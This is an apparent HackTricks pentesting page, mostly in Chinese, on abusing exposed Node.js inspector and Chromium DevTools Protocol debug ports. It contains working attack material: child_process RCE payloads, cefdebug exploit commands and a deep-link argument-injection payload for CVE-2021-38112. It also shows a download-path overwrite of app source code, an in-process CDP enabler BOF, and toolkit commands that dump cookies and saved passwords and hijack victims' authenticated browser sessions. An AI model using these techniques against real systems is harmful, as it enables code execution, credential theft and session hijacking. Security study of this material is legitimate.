# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

历史上的实战示例包括 Multimaster 演练和 CVE-2019-1414 Visual Studio Code debugger 攻击；应将它们视为特定版本的背景信息，而不要假设所有当前的 Electron 或 Chromium 目标都暴露了相同的原语。<sup>[[1]](#references)[[3]](#references)</sup>

## Basic Information

[根据文档](https://nodejs.org/learn/getting-started/debugging)：使用 `--inspect` 开关启动时，Node.js 进程会监听调试客户端。**默认**情况下，它会在主机和端口 **`127.0.0.1:9229`** 上监听。每个进程还会被分配一个**唯一**的 **UUID**。<sup>[[4]](#references)</sup>

Inspector 客户端必须知道并指定主机地址、端口和 UUID 才能连接。完整 URL 看起来类似 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。<sup>[[4]](#references)</sup>

> [!WARNING]
> 由于 **debugger 可以完全访问 Node.js 执行环境**，能够连接此端口的恶意行为者可能可以代表 Node.js 进程执行任意代码（**潜在的权限提升**）。<sup>[[4]](#references)</sup>

启动 inspector 有几种方式：<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

当你启动一个正在检查的进程时，会出现类似这样的内容：<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

基于 **CEF**（**Chromium Embedded Framework**）的进程可以通过 `--remote-debugging-port=9222` 暴露调试器。这会通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 暴露浏览器，而不是 Node.js inspector，因此默认情况下，基于 Node.js `process` 的 payload 并不直接适用。<sup>[[2]](#references)[[5]](#references)</sup>

启动带调试功能的浏览器时，会出现类似以下内容：<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### 枚举并驱动 CDP 端点

HTTP 发现端点会区分 **browser** WebSocket 与各个 **target**（标签页、worker、扩展程序等）WebSocket。查询 `/json/version` 获取 browser 端点，查询 `/json/list` 获取 targets；随后可直接使用 CDP 类似 JSON-RPC 的消息驱动返回的 `webSocketDebuggerUrl` 值。<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

例如，使用 `websocat "$BROWSER_WS"` 连接并发送 `{"id":1,"method":"Target.getTargets"}` 或 `{"id":2,"method":"Storage.getCookies"}`。对于页面 target（`websocat "$PAGE_WS"`），`Runtime.evaluate` 会在其 renderer 中执行，而 `Page.captureScreenshot` 会返回 base64 编码的截图。`document.cookie` 无法显示 `HttpOnly` cookie，而 `Storage.getCookies` 会向浏览器请求其 cookie 存储区。<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### 浏览器、WebSockets 和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在 Web 浏览器中打开的网站可以在浏览器安全模型下发起 WebSocket 和 HTTP 请求。**初始 HTTP 连接**是**获取唯一调试器会话 ID**所必需的。**同源策略**会**阻止**网站发起**此 HTTP 连接**。为进一步防范 [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**，**Node.js 会验证连接的 **'Host' 标头**是否明确指定了一个 **IP 地址**或 **`localhost`**。<sup>[[4]](#references)</sup>

> [!TIP]
> 这项**安全措施会阻止攻击者仅通过发送 HTTP 请求来利用 inspector 执行代码**（这可以通过利用 SSRF 漏洞实现）。<sup>[[4]](#references)</sup>

### 在运行中的进程里启动 inspector

你可以向正在运行的 nodejs 进程发送 **SIGUSR1 信号**，使其在默认端口启动 **inspector**。不过请注意，你需要拥有足够的权限，因此这可能会授予你**访问进程内信息的特权**，但不会直接造成权限提升。<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> 这在容器中很有用，因为**关闭进程并使用 `--inspect` 启动新进程**是**不可行的**，因为**容器**会随进程一起被**终止**。<sup>[[6]](#references)</sup>

### 连接到 inspector/debugger

要连接到基于 **Chromium** 的浏览器，可以分别访问 Chrome 或 Edge 的 `chrome://inspect` 或 `edge://inspect` URL。点击 Configure 按钮后，应确保**目标主机和端口**已正确列出。下图展示了一个远程代码执行（RCE）示例：<sup>[[2]](#references)[[4]](#references)</sup>

![之后会显示用于访问 debugger 的 URL，例如 ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - 连接到 inspector/debugger：要连接到基于 Chromium 的浏览器，……](<../../images/image (674).png>)

使用**命令行**可以连接到 debugger/inspector：<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) 可以**查找**本地运行的 inspector，并向其中**注入代码**。<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> 请注意，如果通过 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 连接到浏览器，**NodeJS RCE exploits 将不起作用**（你需要检查 API，看看可以用它做哪些有趣的事情）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS 调试器/Inspector 中的 RCE

> [!TIP]
> 如果你来这里是想了解如何[**通过 Electron 中的 XSS 获取 RCE，请查看此页面。**](../../desktop-application-security/electron-desktop-apps/index.html)

当你能够**连接**到 Node **inspector** 时，获取 **RCE** 的一些常见方法是使用类似以下的方式（看起来这**在连接到 Chrome DevTools protocol 时不起作用**）：<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

你可以在此处查看 API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)。<sup>[[5]](#references)</sup>
本节仅列出我发现有人曾利用此协议进行 exploit 的一些有趣案例。

### Chrome 136+ 默认配置文件限制

从 **Chrome 136** 开始，如果 `--remote-debugging-port` 和 `--remote-debugging-pipe` 指向 **默认 Chrome 数据目录**，Chrome 会忽略这两个参数。必须同时使用非标准的 `--user-data-dir`，因为单独的加密密钥和隔离的浏览器状态可避免简单的基于标志的技术暴露用户正常登录的配置文件。未经验证，不应假定此 Chrome 特有限制也适用于旧版 Chrome、Chrome for Testing、Electron/CEF 应用或其他 Chromium 衍生版本。<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

因此，仅看到当前 Chrome 进程是通过 `--remote-debugging-port` 启动的，**并不能**证明 CDP 已激活。请确认监听器和 `/json/version`，并确定实际为其提供支持的配置文件。<sup>[[14]](#references)</sup>

### 通过深度链接进行参数注入

在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino Security 发现，一个基于 CEF 的应用程序在系统中**注册了自定义 URI**（workspaces://index.html），该 URI 会接收完整的 URI，然后**启动基于 CEF 的应用程序**，其配置部分由该 URI 构造而成。<sup>[[8]](#references)</sup>

研究人员发现，URI 参数会经过 URL 解码，并用于启动 CEF 基础应用程序，因此用户可以在**命令行**中**注入**标志 **`--gpu-launcher`** 并执行任意操作。<sup>[[8]](#references)</sup>

因此，类似这样的 payload：

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

将执行 calc.exe。<sup>[[8]](#references)</sup>

### 覆盖文件

更改**下载文件的保存位置**，并下载一个文件，用你的**恶意代码**覆盖应用程序中经常使用的**源代码**。<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE 和数据外传

STAR Labs 展示了暴露的 WebDriver/CDP 服务可能导致任意文件读取和 RCE；在某些配置中，DNS rebinding 可以完成整个 exploit chain。<sup>[[9]](#references)</sup>

ChromeDriver 的 WebDriver 服务与 Chrome DevTools/CDP 不同。其 [`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities) 用于选择启动新 session 时所用的浏览器可执行文件。如果低权限调用者能够访问以 root 身份运行的 ChromeDriver 服务，并提交一个使用调用者可控可执行文件路径的 session，那么该启动操作可能跨越服务的权限边界。空的 `/sessions` 响应并不能确定是否可以创建新 session。在判断该路径是否可用之前，应检查进程所有者、实际监听器是否可访问、session 授权、可执行文件访问权限和隔离机制；仅凭进程名称或常用端口不足以得出结论。[Google 的安全指南](https://developer.chrome.com/docs/chromedriver/security-considerations)建议以低权限账户运行 ChromeDriver。被动枚举不应创建 WebDriver session。

如需了解其他历史上的浏览器自动化和 Chromium 安全案例，请参阅 Counter WebDriver write-up 以及 Project Zero 问题 773、1742 和 1944。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 在运行中的 Chromium 进程内启用 CDP

Chrome 的默认配置文件限制只会阻止通过命令行启用功能的路径。只要具备足够的同一用户权限来操纵浏览器进程，原始的 [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) 和 Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) 就会在已运行的 `chrome.exe` 或 `msedge.exe` 内调用 Chromium 未导出的 `content::DevToolsAgentHost::StartRemoteDebuggingServer`。因此，该 endpoint 属于真实配置文件，并保留其标签页、扩展、cookies 和已认证状态。<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

对于普通的 x64 Chrome/Edge 进程，BOF 会查找浏览器窗口和已加载的 `chrome.dll`/`msedge.dll`，扫描远程 PE 以查找带掩码的签名，分配存根代码和上下文块，临时替换窗口过程，并在浏览器 **UI 线程**上分发最终调用。相关的运行时输入包括 `StartRemoteDebuggingServer`、Chromium 的 `operator new`、`TCPServerSocketFactory::CreateForHttpServer` 和工厂 vtable。除非每个必需签名都只有一个匹配项，否则执行会停止。<sup>[[15]](#references)[[16]](#references)</sup>

BOF 接受浏览器模式和可选端口。随后，其辅助脚本可以验证 endpoint 并收集 cookies；`chrome-iso` 则是针对 Chrome Windows Process Isolation 边界的独立路径。<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

`chrome-iso` 路径仅使用对隔离进程的查询受限句柄。它会识别已安装且 PE 映像大小与正在运行的进程匹配的 `chrome.dll`，从该本地映像解析符号，并利用 Chromium 的 `WindowImpl` 分发机制、同步 `WM_COPYDATA` 以及现有映像中的 User32 hook 访问 UI 线程。<sup>[[16]](#references)</sup>

> [!WARNING]
> 这是一种**入侵浏览器进程后的操控**技术，并非无需身份验证的网络绕过手段。该技术依赖特定构建版本，因为相关 C++ 符号未导出，且可能在浏览器更新后发生变化。<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### 浏览器更新后的签名刷新

使用目标上安装的确切版本的 `chrome.dll` 或 `msedge.dll` 及其匹配的 PDB。Windows SDK 中的 `symchk.exe` 会下载符号；随后，仓库脚本会定位 `StartRemoteDebuggingServer`、推导分配器/套接字工厂输入，或验证 BOF 中嵌入的所有签名。<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

零命中或多命中结果都不能用任意地址替代。如果已知的 `operator new` 或 `CreateForHttpServer` pattern 变化过大，无法据此创建新的 mask，请使用 `pe_signature_finder.py` 配合 PDB 检查该符号，并推导出在目标模块中唯一的字节序列。<sup>[[16]](#references)[[18]](#references)</sup>

#### 使用 CDP Toolkit 提取已认证浏览器数据

此技术不会离线解密 App-Bound Encryption (ABE)，也不会移除设备绑定。相反，它将合法浏览器用作**解密 oracle 和已认证交互代理**：`Storage.getCookies` 会向运行中的浏览器请求其 cookie 存储，而导航和 screencast 工作流则让请求、存储、企业身份验证和设备绑定行为都留在受害者现有的浏览器中。<sup>[[17]](#references)[[18]](#references)</sup>

将 loopback CDP listener 路由经过 operator 的 pivot 后，[**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) 可以枚举并收集常见 artifacts。<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`、`tabs list`、`cookies dump` 和 `tabs screenshot` 基本上是对 `/json/version`、目标列表、`Storage.getCookies` 和 `Page.captureScreenshot` 的封装。历史记录、书签、扩展程序和密码元数据则需要临时的 `chrome://`/`edge://` WebUI target：工具包会等待页面渲染，检查其模型或 DOM，收集结果，然后关闭 target。<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` 会更进一步：它会打开真实的已保存登录源，聚焦凭据字段，使用 CDP 输入事件选择原生自动填充建议，然后读取填入的值。源/端口/路径必须与已保存密码的 realm 高度匹配；由于建议弹窗是原生浏览器 UI，可见模式是可靠的默认选项。<sup>[[17]](#references)[[18]](#references)</sup>

对于实时交互，`browser-takeover screencast` 会串流画面帧，并向真实 target 发送输入（包括后台或屏幕外模式）。`browser-takeover proxy` 则在本地接收 HTTP 和 HTTPS `CONNECT` 请求，并通过隐藏的 Chrome target 发起上游请求；如果隐藏 target 不可用，则回退到后台标签页。这种方式保留了受害者的网络/身份验证上下文，但对于复杂的客户端应用来说，效果不够忠实，因为返回的内容由操作员的浏览器渲染。<sup>[[17]](#references)[[18]](#references)</sup>

进行检测时，不要只依赖 `--remote-debugging-*` 命令行遥测：还应将浏览器进程上的异常句柄和内存操作（`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`、线程创建）、DLL 注入，以及由 Chrome/Edge 所拥有的异常 loopback 监听套接字进行关联分析。<sup>[[15]](#references)</sup>

### 后渗透

在真实环境中，**入侵**使用 Chromium 内核浏览器的用户 PC **之后**，一种历史技巧是重新启动浏览器并启用调试，然后转发 loopback 端口。在仍接受所选 profile 的产品/版本上，这可能暴露受害者的浏览状态，但 Chrome 136+ 不会对其默认数据目录接受这种操作。<sup>[[7]](#references)[[14]](#references)</sup>

下方保留了适用于旧版/特定版本目标的原始重启命令。第二条命令是当前 Chrome 支持的形式，但它会创建隔离的 profile，而不是重新打开受害者通常使用的已认证状态。<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

对于 macOS 特定的 Chromium 重新启动、扩展和 CDP 技术，请参阅 [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md)。



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium 调试器检查与利用工具](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414：通过 Chrome DevTools Debugger 在 Visual Studio Code 中实现远程代码执行](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js 调试指南 - 入门](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation：滥用 Chrome 调试功能远程观察和控制浏览会话](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112：AWS WorkSpaces 远程代码执行](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [你在和我说话吗？- 通过 DNS Rebinding 和 CDP 实现 WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [对抗 WebDriver - 从 Bot 到 RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero 问题 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero 问题 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero 问题 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [改进安全性的远程调试开关变更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [向正在运行的 Edge 浏览器注入 CDP：深入了解运行时浏览器插桩](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monster 回归](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
